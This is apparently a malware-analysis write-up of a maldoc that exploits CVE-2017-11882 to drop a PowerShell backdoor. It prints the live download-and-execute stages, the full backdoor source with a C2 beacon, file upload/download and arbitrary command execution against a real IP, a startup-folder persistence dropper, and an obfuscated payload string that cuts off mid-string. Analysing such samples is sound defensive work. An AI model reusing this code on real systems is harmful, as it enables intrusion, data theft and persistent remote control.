---
title: Maldoc --> PS Backdoor 2020-04-19
excerpt_separator: "<!--more-->"
classes: wide
---
A brief and incomplete analysis of a multistage maldoc on [Any Run](https://app.any.run/tasks/c9eb3152-7d70-4828-bc61-f9aba1570e24/) 
levering the Equation Editor Exploit to drop a PowerShell backdoor which dropped multiple payloads.  The Powershell 
backdoor contains functions to download and upload files and execute arbitrary powershell commands.

<!--more-->

Sample was found via [Any Run](https://app.any.run/tasks/c9eb3152-7d70-4828-bc61-f9aba1570e24/)
md5: abd6f60aeeaa62e730882f5258586839

This sample is an RFT file

# Overview
CVE-2017-11882 is used to start mshta.exe ([ATT&CK Technique T1170](https://attack.mitre.org/techniques/T1170/)) and request `http://194.127.179.111:8787/AFK`

The returned data from the request uses WMI Win32_ProcessStartup is used to specify the creation of a hidden powershell window and Win32_Process is used to actually start PowerShell. 
This powershell command downloads another remote resource from `http://194.127.179.111:8787/get` and is then invoked via the `Invoke-Expression` (`I'E'X`) command.

# Additional Writeups
[SonicWall](https://securitynews.sonicwall.com/xmlpost/netwire-rat-bypassing-amsi-scanning-for-powershell-script-by-patching-bytes-in-memory/)

## Related sample
[Any Run](https://app.any.run/tasks/5fd0a42c-66ad-48ce-b892-18f48a922d4c/) mentioned in [rtfobj issue](https://github.com/decalage2/oletools/issues/546) 

# Dropper
- Stage 1 - CVE-2017-11882
- Stage 2 - `msha.exe` running javascript to invoke powershell
- Stage 3 -  powershell used to download powershell backdoor
- Payload 1 - Powershell backdoor 
- Payload 2 - Payload 1 used to download additional sample
- Payload 3 - Payload 1 used to download additional sample

## Equation Editor Exploit
After the RTF is loaded, CVE-2017-11882 is used to call `mshta.exe` and load a remote javascript function from `http://194.127.179.111:8787/AFK`.  
The javascript contains hex obfuscation that can be decoded by replacing the `eval` statement to a `console.log` and running it in a safe environment

----
The original returned data can be found in [malware_lives_here/artifacts/AFK.bin]({{ site.url }}{{ site.baseurl }}/assets/abd6f60aeeaa62e730882f5258586839/malware_lives_here/artifacts/AFK.bin)  

deobfuscated javascript shows WMI ([ATT&CK Technique T1047](https://attack.mitre.org/techniques/T1047/)) being used to start the powershell process ([ATT&CK Technique T1086](https://attack.mitre.org/techniques/T1086/))
 
```text
var cm="Powershell -exec Bypass -w 1 -c $NUMBEROFWMIHIGHPERFORMANCEPROVIDERRETURNEDBYWMIADAPTER=New-Object Net.WebClient;$NUMBEROFWMIHIGHPERFORMANCEPROVIDERRETURNEDBYWMIADAPTER.proxy=[<#000#>Net.WebRequest<#000#>]::GetSystemWebProxy();$NUMBEROFWMIHIGHPERFORMANCEPROVIDERRETURNEDBYWMIADAPTER.Proxy.Credentials=[<#000#>Net.CredentialCache<#000#>]::DefaultCredentials;I'E'X($NUMBEROFWMIHIGHPERFORMANCEPROVIDERRETURNEDBYWMIADAPTER.DownloadString(\'http://194.127.179.111:8787/get\'));";
var w32ps= GetObject('WiNmGmTs:').Get('Win32_ProcessStartup');
w32ps.SpawnInstance_();
w32ps.ShowWindow=0;
var rtrnCode=GetObject('WiNmGmTs:').Get('Win32_Process').Create(cm,'c:\\',w32ps,null);
```   


## Powershell
Powershell here creates a proxy aware authenticated network request to `http://194.127.179.111:8787/get` and runs the resulting code via the `Invoke-Expression` shorthand using `I'E'X`
```text
Powershell -exec Bypass -w 1 -c $NUMBEROFWMIHIGHPERFORMANCEPROVIDERRETURNEDBYWMIADAPTER=New-Object Net.WebClient;$NUMBEROFWMIHIGHPERFORMANCEPROVIDERRETURNEDBYWMIADAPTER.proxy=[<#000#>Net.WebRequest<#000#>]::GetSystemWebProxy();
$NUMBEROFWMIHIGHPERFORMANCEPROVIDERRETURNEDBYWMIADAPTER.Proxy.Credentials=[<#000#>Net.CredentialCache<#000#>]::DefaultCredentials;
I'E'X($NUMBEROFWMIHIGHPERFORMANCEPROVIDERRETURNEDBYWMIADAPTER.DownloadString('http://194.127.179.111:8787/get'));
```

# PowerShell BackDoor
The original returned data can be found in [malware_lives_here/artifacts/ps1_backdoor.bin]({{ site.url }}{{ site.baseurl }}/assets/abd6f60aeeaa62e730882f5258586839/malware_lives_here/artifacts/ps1_backdoor.bin)

We'll step through the powershell backdoor logically as it would when executed.

## Powershell Backdoor Variables and initial Checkin
```
$hostname = $env:COMPUTERNAME;
$whoami = $env:USERNAME;
$arch = (Get-WmiObject Win32_OperatingSystem).OSArchitecture
$os = (Get-WmiObject -class Win32_OperatingSystem).Caption;
$domain = (Get-WmiObject Win32_ComputerSystem).Domain;
$IP = (gwmi -query "Select IPAddress From Win32_NetworkAdapterConfiguration Where IPEnabled = True").IPAddress[0]
$random = -join ((65 .. 90) | Get-Random -Count 5 | % { [char]$_ });
$agent = "$random-img.jpeg"
$finaldata = "[ $os ]**[ $IP ]**[ $arch ]**[ $hostname ]**[ $domain ]**[ $whoami ]"
$h3 = new-object net.WebClient
$h3.Headers.Add("Content-Type", "application/x-www-form-urlencoded")
$h = $h3.UploadString("http://194.127.179.111:8787/info/$agent", "data="+$finaldata)
$h2 = New-Object system.Net.WebClient;
$h3 = New-Object system.Net.WebClient;
``` 

Upon running, the above sets some variables and does the initial checkin to the CnC server as observed in the pcap  
![]({{ site.url }}{{ site.baseurl }}/assets/abd6f60aeeaa62e730882f5258586839/images/initial-checkin_pcap.png)


### FuckYou_MalwareHunterTeam
The first function called is `FuckYou_MalwareHunterTeam`, which actually just define and then calls the function `KasperskyInternetSecurity`. 


The downloaded and executed powershell contains one obfuscated function
```text
function FuckYou_MalwareHunterTeam
{
    $ASDASDASDASDASDANSDJSNDANSDOKNASDNALASDASADSD=@(102,117,110,99,116,105,111,110,32,75,97,115,112,101,114,115,107,121,73,110,116,101,114,110,101,116,83,101,99,117,114,105,116,121,13,10,123,13,10,32,32,32,32,36,77,97,108,119,97,114,101,98,121,116,101,115,61,91,65,112,112,68,111,109,97,105,110,93,58,58,67,114,101,97,116,101,68,111,109,97,105,110,40,39,84,114,117,115,116,101,100,32,65,112,112,100,111,109,97,105,110,39,44,36,110,117,108,108,44,91,65,112,112,68,111,109,97,105,110,93,58,58,67,117,114,114,101,110,116,68,111,109,97,105,110,58,58,83,101,116,117,112,73,110,102,111,114,109,97,116,105,111,110,58,58,65,112,112,108,105,99,97,116,105,111,110,66,97,115,101,41,59,13,10,32,32,32,32,36,77,97,108,119,97,114,101,98,121,116,101,115,46,80,101,114,109,105,115,115,105,111,110,83,101,116,46,73,115,85,110,114,101,115,116,114,105,99,116,101,100,13,10,32,32,32,32,36,77,97,108,119,97,114,101,98,121,116,101,115,46,83,101,116,67,97,99,104,101,80,97,116,104,40,39,67,58,92,85,115,101,114,115,92,80,117,98,108,105,99,39,41,59,13,10,32,32,32,32,36,77,97,108,119,97,114,101,98,121,116,101,115,46,65,112,112,101,110,100,80,114,105,118,97,116,101,80,97,116,104,40,39,67,58,92,85,115,101,114,115,92,80,117,98,108,105,99,39,41,59,13,10,32,32,32,32,36,77,97,108,119,97,114,101,98,121,116,101,115,32,61,32,39,67,58,92,85,115,101,114,115,92,39,32,43,32,36,101,110,118,58,85,115,101,114,78,97,109,101,32,43,32,39,92,65,112,112,68,97,116,97,92,82,111,97,109,105,110,103,92,77,105,99,114,111,115,111,102,116,92,87,105,110,100,111,119,115,92,83,116,97,114,116,32,77,101,110,117,92,80,114,111,103,114,97,109,115,92,83,116,97,114,116,117,112,92,39,13,10,32,32,32,32,40,78,101,119,45,79,98,106,101,99,116,32,78,101,116,46,87,101,98,67,108,105,101,110,116,41,46,68,111,119,110,108,111,97,100,70,105,108,101,40,39,104,116,116,112,58,47,47,119,119,119,46,109,57,99,46,110,101,116,47,117,112,108,111,97,100,115,47,49,53,56,55,51,51,49,51,50,51,49,46,106,112,103,39,44,32,36,77,97,108,119,97,114,101,98,121,116,101,115,32,43,32,39,83,121,110,99,65,112,112,118,80,117,98,108,105,115,104,105,110,103,83,101,114,118,101,114,46,118,98,115,39,41,13,10,32,32,32,32,73,110,118,111,107,101,45,73,116,101,109,32,34,67,58,92,85,115,101,114,115,92,36,101,110,118,58,85,115,101,114,78,97,109,101,92,65,112,112,68,97,116,97,92,82,111,97,109,105,110,103,92,77,105,99,114,111,115,111,102,116,92,87,105,110,100,111,119,115,92,83,116,97,114,116,32,77,101,110,117,92,80,114,111,103,114,97,109,115,92,83,116,97,114,116,117,112,92,83,121,110,99,65,112,112,118,80,117,98,108,105,115,104,105,110,103,83,101,114,118,101,114,46,118,98,115,34,13,10,125,13,10,75,97,115,112,101,114,115,107,121,73,110,116,101,114,110,101,116,83,101,99,117,114,105,116,121);[System.Text.Encoding]::ASCII.GetString($ASDASDASDASDASDANSDJSNDANSDOKNASDNALASDASADSD)|I`E`X
}
```

which can easily be decoded to the below function

```text
function FuckYou_MalwareHunterTeam
{
    #$ASDASDASDASDASDANSDJSNDANSDOKNASDNALASDASADSD=@(102,117,110,99,116,105,111,110,32,75,97,115,112,101,114,115,107,121,73,110,116,101,114,110,101,116,83,101,99,117,114,105,116,121,13,10,123,13,10,32,32,32,32,36,77,97,108,119,97,114,101,98,121,116,101,115,61,91,65,112,112,68,111,109,97,105,110,93,58,58,67,114,101,97,116,101,68,111,109,97,105,110,40,39,84,114,117,115,116,101,100,32,65,112,112,100,111,109,97,105,110,39,44,36,110,117,108,108,44,91,65,112,112,68,111,109,97,105,110,93,58,58,67,117,114,114,101,110,116,68,111,109,97,105,110,58,58,83,101,116,117,112,73,110,102,111,114,109,97,116,105,111,110,58,58,65,112,112,108,105,99,97,116,105,111,110,66,97,115,101,41,59,13,10,32,32,32,32,36,77,97,108,119,97,114,101,98,121,116,101,115,46,80,101,114,109,105,115,115,105,111,110,83,101,116,46,73,115,85,110,114,101,115,116,114,105,99,116,101,100,13,10,32,32,32,32,36,77,97,108,119,97,114,101,98,121,116,101,115,46,83,101,116,67,97,99,104,101,80,97,116,104,40,39,67,58,92,85,115,101,114,115,92,80,117,98,108,105,99,39,41,59,13,10,32,32,32,32,36,77,97,108,119,97,114,101,98,121,116,101,115,46,65,112,112,101,110,100,80,114,105,118,97,116,101,80,97,116,104,40,39,67,58,92,85,115,101,114,115,92,80,117,98,108,105,99,39,41,59,13,10,32,32,32,32,36,77,97,108,119,97,114,101,98,121,116,101,115,32,61,32,39,67,58,92,85,115,101,114,115,92,39,32,43,32,36,101,110,118,58,85,115,101,114,78,97,109,101,32,43,32,39,92,65,112,112,68,97,116,97,92,82,111,97,109,105,110,103,92,77,105,99,114,111,115,111,102,116,92,87,105,110,100,111,119,115,92,83,116,97,114,116,32,77,101,110,117,92,80,114,111,103,114,97,109,115,92,83,116,97,114,116,117,112,92,39,13,10,32,32,32,32,40,78,101,119,45,79,98,106,101,99,116,32,78,101,116,46,87,101,98,67,108,105,101,110,116,41,46,68,111,119,110,108,111,97,100,70,105,108,101,40,39,104,116,116,112,58,47,47,119,119,119,46,109,57,99,46,110,101,116,47,117,112,108,111,97,100,115,47,49,53,56,55,51,51,49,51,50,51,49,46,106,112,103,39,44,32,36,77,97,108,119,97,114,101,98,121,116,101,115,32,43,32,39,83,121,110,99,65,112,112,118,80,117,98,108,105,115,104,105,110,103,83,101,114,118,101,114,46,118,98,115,39,41,13,10,32,32,32,32,73,110,118,111,107,101,45,73,116,101,109,32,34,67,58,92,85,115,101,114,115,92,36,101,110,118,58,85,115,101,114,78,97,109,101,92,65,112,112,68,97,116,97,92,82,111,97,109,105,110,103,92,77,105,99,114,111,115,111,102,116,92,87,105,110,100,111,119,115,92,83,116,97,114,116,32,77,101,110,117,92,80,114,111,103,114,97,109,115,92,83,116,97,114,116,117,112,92,83,121,110,99,65,112,112,118,80,117,98,108,105,115,104,105,110,103,83,101,114,118,101,114,46,118,98,115,34,13,10,125,13,10,75,97,115,112,101,114,115,107,121,73,110,116,101,114,110,101,116,83,101,99,117,114,105,116,121);[System.Text.Encoding]::ASCII.GetString($ASDASDASDASDASDANSDJSNDANSDOKNASDNALASDASADSD)|I`E`X
    function KasperskyInternetSecurity
    {
        $Malwarebytes=[AppDomain]::CreateDomain('Trusted Appdomain',$null,[AppDomain]::CurrentDomain::SetupInformation::ApplicationBase);
        $Malwarebytes.PermissionSet.IsUnrestricted
        $Malwarebytes.SetCachePath('C:\Users\Public');
        $Malwarebytes.AppendPrivatePath('C:\Users\Public');
        $Malwarebytes = 'C:\Users\' + $env:UserName + '\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\'
        (New-Object Net.WebClient).DownloadFile('http://www.m9c.net/uploads/15873313231.jpg', $Malwarebytes + 'SyncAppvPublishingServer.vbs')
        Invoke-Item "C:\Users\$env:UserName\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\SyncAppvPublishingServer.vbs"
    }
    KasperskyInternetSecurity
}
```

We'll stop here for now and come back to this later, for now, lets continue on the powershell backdoor.


### Powershell Backdoor(cont)

So now that we've followed the `FuckYou_MalwareHunterTeam` function all the way, let's come back to the powershell backdoor.

The supported functions and callbacks are all described in this code.  

```text
while ($true)
{
    $cmd = $h2.downloadString("http://194.127.179.111:8787/cm/$agent");
    #echo $cmd
    if ($cmd -eq "REGISTER")
    {
        $h3 = new-object net.WebClient
        $h3.Headers.Add("Content-Type", "application/x-www-form-urlencoded")
        $h3.UploadString("http://194.127.179.111:8787/info/$agent", "data="+$finaldata)
        continue
    }
    if ($cmd -eq "")
    {
        sleep 2
        continue
    }
    elseif ($cmd.split(" ")[0] -eq "load")
    {
        $f = $cmd.split(" ")[1]
        $module = load -module $f
        try
        {
            $output = Invoke-Expression ($module) | Out-String
        }
        catch
        {
            $output = $Error[0] | Out-String;
        }
    }
    elseif ($cmd.split(" ")[0] -eq "download")
    {
        try
        {
            $file = $cmd.split(" ")[1]
            echo $file
            $path = $cmd.split(" ")[2]
            echo $path
            $filedata=Download -file $file
            $bytes = [Convert]::FromBase64String($filedata)
            [IO.File]::WriteAllBytes($path, $bytes)
            $output="download file to $path"
        }
        catch
        {
            $output = "err download file"
        }
    }
    elseif ($cmd.split(" ")[0] -eq "upload")
    {
        try
        {
            $path = $cmd.split(" ")[1]
            #echo $file
            $filedata=[IO.File]::ReadAllBytes($path)
            $bytes = [Convert]::ToBase64String($filedata)
            echo $bytes
            $output=upload -file $bytes
        }
        catch
        {
            $output = "err upload file"
        }
    }
    else
    {

        try
        {
            $output = Invoke-Expression ($cmd) | Out-String
        }
        catch
        {
            #$output = $Error[0] | Out-String;
        }
    }
    #Echo $output
    $bytes = [System.Text.Encoding]::UTF8.GetBytes($output)
    $redata = [System.Convert]::ToBase64String($bytes)
    $h3.Headers.Add("Content-Type", "application/x-www-form-urlencoded")
    $re = $h3.UploadString("http://194.127.179.111:8787/re/$agent", "data="+$redata);
}
```

This can loosely be described as follows
#### main
fetches the url `http://194.127.179.111:8787/cm/$agent");` and gets the command from the C2 Server
    
#### register
Sends the client data ($finaldata) to the C2 Server at `http://194.127.179.111:8787/info/$agent`
```text
    if ($cmd -eq "REGISTER")
    {
        $h3 = new-object net.WebClient
        $h3.Headers.Add("Content-Type", "application/x-www-form-urlencoded")
        $h3.UploadString("http://194.127.179.111:8787/info/$agent", "data="+$finaldata)
        continue
    }
```
#### load
Downloads and executes additional powershell from `http://194.127.179.111:8787/md/$agent` (via post with 'data=' parama)

```
    elseif ($cmd.split(" ")[0] -eq "load")
    {
        $f = $cmd.split(" ")[1]
        $module = load -module $f
        try
        {
            $output = Invoke-Expression ($module) | Out-String
        }
        catch
        {
            $output = $Error[0] | Out-String;
        }
    }


function load($module)
{



    $handle = new-object net.WebClient;
    $handleh = $handle.Headers;
    $handleh.add("Content-Type", "application/x-www-form-urlencoded");
    $modulecontent = $handle.UploadString("http://194.127.179.111:8787/md/$agent", "data="+"$module");



    return $modulecontent
}
```

#### download
Downloads a file from the c2 server to the client.  File will be fetched from `http://194.127.179.111:8787/up/$agent` 
(via post with 'data=' param)

```text

    elseif ($cmd.split(" ")[0] -eq "download")
    {
        try
        {
            $file = $cmd.split(" ")[1]
            echo $file
            $path = $cmd.split(" ")[2]
            echo $path
            $filedata=Download -file $file
            $bytes = [Convert]::FromBase64String($filedata)
            [IO.File]::WriteAllBytes($path, $bytes)
            $output="download file to $path"
        }
        catch
        {
            $output = "err download file"
        }
    }

function Download($file)
{



    $handle = new-object net.WebClient;
    $handleh = $handle.Headers;
    $handleh.add("Content-Type", "application/x-www-form-urlencoded");
    $modulecontent = $handle.UploadString("http://194.127.179.111:8787/up/$agent", "data="+"$file");
    return $modulecontent
}
```



#### upload
This function sends a file to the C2 server from the client. 

The content of the file will be base64 encoded, and then uploaded to `http://194.127.179.111:8787/img/$agent` 
(via POST with `data=` param)

```text
    elseif ($cmd.split(" ")[0] -eq "upload")
    {
        try
        {
            $path = $cmd.split(" ")[1]
            #echo $file
            $filedata=[IO.File]::ReadAllBytes($path)
            $bytes = [Convert]::ToBase64String($filedata)
            echo $bytes
            $output=upload -file $bytes
        }
        catch
        {
            $output = "err upload file"
        }
    }

function upload($file)
{



    $handle = new-object net.WebClient;
    $handleh = $handle.Headers;
    $handleh.add("Content-Type", "application/x-www-form-urlencoded");
    $modulecontent = $handle.UploadString("http://194.127.179.111:8787/img/$agent", "data="+"$file");
    return $modulecontent
}
```


#### default
By default, if the response from the "`main`" function is blank, the process will sleep for 2 second and try again.  
```text
    if ($cmd -eq "")
    {
        sleep 2
        continue
    }
``` 

otherwise, if it isn't blank and does not match either `REIGSTER`, `load`, `download` or `upload` the response will be 
run via powershell. 

```text
    else
    {

        try
        {
            $output = Invoke-Expression ($cmd) | Out-String
        }
        catch
        {
            #$output = $Error[0] | Out-String;
        }
    }
``` 


### command output
All command output from the ran commands will be sent to the server as well.  The output varies between functions and if it successfully ran or not.


```text
    #Echo $output
    $bytes = [System.Text.Encoding]::UTF8.GetBytes($output)
    $redata = [System.Convert]::ToBase64String($bytes)
    $h3.Headers.Add("Content-Type", "application/x-www-form-urlencoded")
    $re = $h3.UploadString("http://194.127.179.111:8787/re/$agent", "data="+$redata);
}
```

----
Coming back to the `FuckYou_MalwareHunterTeam` function (scroll up to )
## KasperskyInternetSecurity
This function which downloads a file and stores it in running user's the Start Menu Startup items - [Mitre Att&ck T1060](https://attack.mitre.org/techniques/T1060/) and then calls the script.

here's the code again, same as the above just repeated for completeness
```text
function FuckYou_MalwareHunterTeam
{
    #$ASDASDASDASDASDANSDJSNDANSDOKNASDNALASDASADSD=@(102,117,110,99,116,105,111,110,32,75,97,115,112,101,114,115,107,121,73,110,116,101,114,110,101,116,83,101,99,117,114,105,116,121,13,10,123,13,10,32,32,32,32,36,77,97,108,119,97,114,101,98,121,116,101,115,61,91,65,112,112,68,111,109,97,105,110,93,58,58,67,114,101,97,116,101,68,111,109,97,105,110,40,39,84,114,117,115,116,101,100,32,65,112,112,100,111,109,97,105,110,39,44,36,110,117,108,108,44,91,65,112,112,68,111,109,97,105,110,93,58,58,67,117,114,114,101,110,116,68,111,109,97,105,110,58,58,83,101,116,117,112,73,110,102,111,114,109,97,116,105,111,110,58,58,65,112,112,108,105,99,97,116,105,111,110,66,97,115,101,41,59,13,10,32,32,32,32,36,77,97,108,119,97,114,101,98,121,116,101,115,46,80,101,114,109,105,115,115,105,111,110,83,101,116,46,73,115,85,110,114,101,115,116,114,105,99,116,101,100,13,10,32,32,32,32,36,77,97,108,119,97,114,101,98,121,116,101,115,46,83,101,116,67,97,99,104,101,80,97,116,104,40,39,67,58,92,85,115,101,114,115,92,80,117,98,108,105,99,39,41,59,13,10,32,32,32,32,36,77,97,108,119,97,114,101,98,121,116,101,115,46,65,112,112,101,110,100,80,114,105,118,97,116,101,80,97,116,104,40,39,67,58,92,85,115,101,114,115,92,80,117,98,108,105,99,39,41,59,13,10,32,32,32,32,36,77,97,108,119,97,114,101,98,121,116,101,115,32,61,32,39,67,58,92,85,115,101,114,115,92,39,32,43,32,36,101,110,118,58,85,115,101,114,78,97,109,101,32,43,32,39,92,65,112,112,68,97,116,97,92,82,111,97,109,105,110,103,92,77,105,99,114,111,115,111,102,116,92,87,105,110,100,111,119,115,92,83,116,97,114,116,32,77,101,110,117,92,80,114,111,103,114,97,109,115,92,83,116,97,114,116,117,112,92,39,13,10,32,32,32,32,40,78,101,119,45,79,98,106,101,99,116,32,78,101,116,46,87,101,98,67,108,105,101,110,116,41,46,68,111,119,110,108,111,97,100,70,105,108,101,40,39,104,116,116,112,58,47,47,119,119,119,46,109,57,99,46,110,101,116,47,117,112,108,111,97,100,115,47,49,53,56,55,51,51,49,51,50,51,49,46,106,112,103,39,44,32,36,77,97,108,119,97,114,101,98,121,116,101,115,32,43,32,39,83,121,110,99,65,112,112,118,80,117,98,108,105,115,104,105,110,103,83,101,114,118,101,114,46,118,98,115,39,41,13,10,32,32,32,32,73,110,118,111,107,101,45,73,116,101,109,32,34,67,58,92,85,115,101,114,115,92,36,101,110,118,58,85,115,101,114,78,97,109,101,92,65,112,112,68,97,116,97,92,82,111,97,109,105,110,103,92,77,105,99,114,111,115,111,102,116,92,87,105,110,100,111,119,115,92,83,116,97,114,116,32,77,101,110,117,92,80,114,111,103,114,97,109,115,92,83,116,97,114,116,117,112,92,83,121,110,99,65,112,112,118,80,117,98,108,105,115,104,105,110,103,83,101,114,118,101,114,46,118,98,115,34,13,10,125,13,10,75,97,115,112,101,114,115,107,121,73,110,116,101,114,110,101,116,83,101,99,117,114,105,116,121);[System.Text.Encoding]::ASCII.GetString($ASDASDASDASDASDANSDJSNDANSDOKNASDNALASDASADSD)|I`E`X
    function KasperskyInternetSecurity
    {
        $Malwarebytes=[AppDomain]::CreateDomain('Trusted Appdomain',$null,[AppDomain]::CurrentDomain::SetupInformation::ApplicationBase);
        $Malwarebytes.PermissionSet.IsUnrestricted
        $Malwarebytes.SetCachePath('C:\Users\Public');
        $Malwarebytes.AppendPrivatePath('C:\Users\Public');
        $Malwarebytes = 'C:\Users\' + $env:UserName + '\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\'
        (New-Object Net.WebClient).DownloadFile('http://www.m9c.net/uploads/15873313231.jpg', $Malwarebytes + 'SyncAppvPublishingServer.vbs')
        Invoke-Item "C:\Users\$env:UserName\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\SyncAppvPublishingServer.vbs"
    }
    KasperskyInternetSecurity
}
```


----
TODO - make mention that SyncAppvPublishingServer is from the jpg
----
### SyncAppvPublishingServer.vbs
The downloaded vbs is available [malware_lives_here/artifacts/SyncAppvPublishingServer.bin]({{ site.url }}{{ site.baseurl }}/assets/abd6f60aeeaa62e730882f5258586839/malware_lives_here/artifacts/SyncAppvPublishingServer.bin)  

I'll be completely honest, and say, i'm not 100% sure why this VBS is doing some things it is doing.  In particular the invocation of `winlogin.exe -legacy_Vista`.  But, I never let that get in the way of learning, so we press on. 

at line 30 we see a call to `ZoneAlarmAntivirus()`  

### ZoneAlarmAntivirus

This function is responsible for the delivery of two additional payloads 
```text
f="X`E`I|)DSAQWESZXDRTFCVGYUHBNJIOKMLP$(gnirtSteG.IICSA::]gnidocnE.txeT.metsyS[;)Zillya4,20Zillya,63,44,93,Zillya0Zillya,02Zillya,Zillya0Zillya,64,05,Zillya5,80Zillya,80Zillya,00Zillya,0ZillyaZillya,7ZillyaZillya,4ZillyaZillya,93,04,40Zillya,6ZillyaZillya,ZillyaZillyaZillya,28,0ZillyaZillya,79,50Zillya,4ZillyaZillya,ZillyaZillyaZillya,80Zillya,07,85,85,39,5ZillyaZillya,2ZillyaZillya,ZillyaZillyaZillya,4ZillyaZillya,Zillya5,89,Zillya2Zillya,76,Zillya9,95,88,69,96,69,37,42Zillya,Zillya4,93,02Zillya,84,93,44,93,29,74,93,04,Zillya0Zillya,99,79,80Zillya,2ZillyaZillya,Zillya0Zillya,4ZillyaZillya,64,Zillya4,93,30Zillya,2ZillyaZillya,60Zillya,64,05,55,55,55,35,05,Zillya5,55,65,35,94,74,5ZillyaZillya,00Zillya,79,ZillyaZillyaZillya,80Zillya,2ZillyaZillya,7ZillyaZillya,74,6ZillyaZillya,Zillya0Zillya,0ZillyaZillya,64,99,75,90Zillya,64,9ZillyaZillya,9ZillyaZillya,9ZillyaZillya,74,74,85,2ZillyaZillya,6ZillyaZillya,6ZillyaZillya,40Zillya,93,44,00Zillya,ZillyaZillyaZillya,40Zillya,6ZillyaZillya,Zillya0Zillya,77,85,85,39,Zillya0Zillya,2ZillyaZillya,Zillya2Zillya,48,80Zillya,80Zillya,79,76,64,99,50Zillya,5ZillyaZillya,79,66,80Zillya,79,7ZillyaZillya,5ZillyaZillya,50Zillya,68,64,6ZillyaZillya,20Zillya,ZillyaZillyaZillya,5ZillyaZillya,ZillyaZillyaZillya,4ZillyaZillya,99,50Zillya,77,Zillya9,44,Zillya4,93,0ZillyaZillya,93,44,93,53,53,53,53,93,04,Zillya0Zillya,99,79,80Zillya,2ZillyaZillya,Zillya0Zillya,4ZillyaZillya,64,93,30Zillya,53,53,53,53,50Zillya,4ZillyaZillya,6ZillyaZillya,38,00Zillya,79,ZillyaZillyaZillya,80Zillya,53,53,53,53,9ZillyaZillya,ZillyaZillyaZillya,86,93,44,Zillya4,6ZillyaZillya,0ZillyaZillya,Zillya0Zillya,50Zillya,80Zillya,76,89,Zillya0Zillya,78,64,6ZillyaZillya,Zillya0Zillya,87,23,6ZillyaZillya,99,Zillya0Zillya,60Zillya,89,97,54,9ZillyaZillya,Zillya0Zillya,87,04,04,Zillya0Zillya,90Zillya,79,0ZillyaZillya,Zillya2Zillya,66,80Zillya,80Zillya,79,76,85,85,39,0ZillyaZillya,ZillyaZillyaZillya,50Zillya,6ZillyaZillya,99,79,4ZillyaZillya,Zillya0Zillya,6ZillyaZillya,0ZillyaZillya,37,64,99,50Zillya,5ZillyaZillya,79,66,80Zillya,79,7ZillyaZillya,5ZillyaZillya,50Zillya,68,64,6ZillyaZillya,20Zillya,ZillyaZillyaZillya,5ZillyaZillya,ZillyaZillyaZillya,4ZillyaZillya,99,50Zillya,77,Zillya9,Zillya6,20Zillya,63,39,39,Zillya9,Zillya0Zillya,6ZillyaZillya,Zillya2Zillya,66,Zillya9,95,88,69,96,69,37,42Zillya,Zillya4,93,30Zillya,2ZillyaZillya,60Zillya,64,94,55,55,55,35,05,Zillya5,55,65,35,94,74,5ZillyaZillya,00Zillya,79,ZillyaZillyaZillya,80Zillya,2ZillyaZillya,7ZillyaZillya,74,6ZillyaZillya,Zillya0Zillya,0ZillyaZillya,64,99,75,90Zillya,64,9ZillyaZillya,9ZillyaZillya,9ZillyaZillya,74,74,85,2ZillyaZillya,6ZillyaZillya,6"
f=f+"ZillyaZillya,40Zillya,93,44,00Zillya,ZillyaZillyaZillya,40Zillya,6ZillyaZillya,Zillya0Zillya,77,85,85,39,Zillya0Zillya,2ZillyaZillya,Zillya2Zillya,48,80Zillya,80Zillya,79,76,64,99,50Zillya,5ZillyaZillya,79,66,80Zillya,79,7ZillyaZillya,5ZillyaZillya,50Zillya,68,64,6ZillyaZillya,20Zillya,ZillyaZillyaZillya,5ZillyaZillya,ZillyaZillyaZillya,4ZillyaZillya,99,50Zillya,77,Zillya9,44,Zillya4,93,0ZillyaZillya,93,44,93,53,53,53,53,93,04,Zillya0Zillya,99,79,80Zillya,2ZillyaZillya,Zillya0Zillya,4ZillyaZillya,64,93,30Zillya,53,53,53,53,50Zillya,4ZillyaZillya,6ZillyaZillya,38,00Zillya,79,ZillyaZillyaZillya,80Zillya,53,53,53,53,9ZillyaZillya,ZillyaZillyaZillya,86,93,44,Zillya4,6ZillyaZillya,0ZillyaZillya,Zillya0Zillya,50Zillya,80Zillya,76,89,Zillya0Zillya,78,64,6ZillyaZillya,Zillya0Zillya,87,23,6ZillyaZillya,99,Zillya0Zillya,60Zillya,89,97,54,9ZillyaZillya,Zillya0Zillya,87,04,04,Zillya0Zillya,90Zillya,79,0ZillyaZillya,Zillya2Zillya,66,80Zillya,80Zillya,79,76,85,85,39,0ZillyaZillya,ZillyaZillyaZillya,50Zillya,6ZillyaZillya,99,79,4ZillyaZillya,Zillya0Zillya,6ZillyaZillya,0ZillyaZillya,37,64,99,50Zillya,5ZillyaZillya,79,66,80Zillya,79,7ZillyaZillya,5ZillyaZillya,50Zillya,68,64,6ZillyaZillya,20Zillya,ZillyaZillyaZillya,5ZillyaZillya,ZillyaZillyaZillya,4ZillyaZillya,99,50Zillya,77,Zillya9,Zillya6,60Zillya,20Zillya,63,95,Zillya4,93,99,50Zillya,5ZillyaZillya,79,66,80Zillya,79,7ZillyaZillya,5ZillyaZillya,50Zillya,68,64,6ZillyaZillya,20Zillya,ZillyaZillyaZillya,5ZillyaZillya,ZillyaZillyaZillya,4ZillyaZillya,99,50Zillya,77,93,04,Zillya0Zillya,90Zillya,79,87,80Zillya,79,50Zillya,6ZillyaZillya,4ZillyaZillya,79,08,40Zillya,6ZillyaZillya,50Zillya,78,00Zillya,79,ZillyaZillyaZillya,67,85,85,39,Zillya2Zillya,80Zillya,89,90Zillya,Zillya0Zillya,5ZillyaZillya,5ZillyaZillya,56,64,0ZillyaZillya,ZillyaZillyaZillya,50Zillya,6ZillyaZillya,99,Zillya0Zillya,80Zillya,20Zillya,Zillya0Zillya,28,64,90Zillya,Zillya0Zillya,6ZillyaZillya,5ZillyaZillya,Zillya2Zillya,38,Zillya9,23,39,00Zillya,50Zillya,ZillyaZillyaZillya,8ZillyaZillya,Zillya9,95,Zillya4,30Zillya,0ZillyaZillya,50Zillya,2ZillyaZillya,63,04,23,80Zillya,50Zillya,6ZillyaZillya,0ZillyaZillya,7ZillyaZillya,23,52Zillya,6ZillyaZillya,Zillya0Zillya,50Zillya,7ZillyaZillya,Zillya8,54,23,94,23,6ZillyaZillya,0ZillyaZillya,7ZillyaZillya,ZillyaZillyaZillya,99,54,23,90Zillya,ZillyaZillyaZillya,99,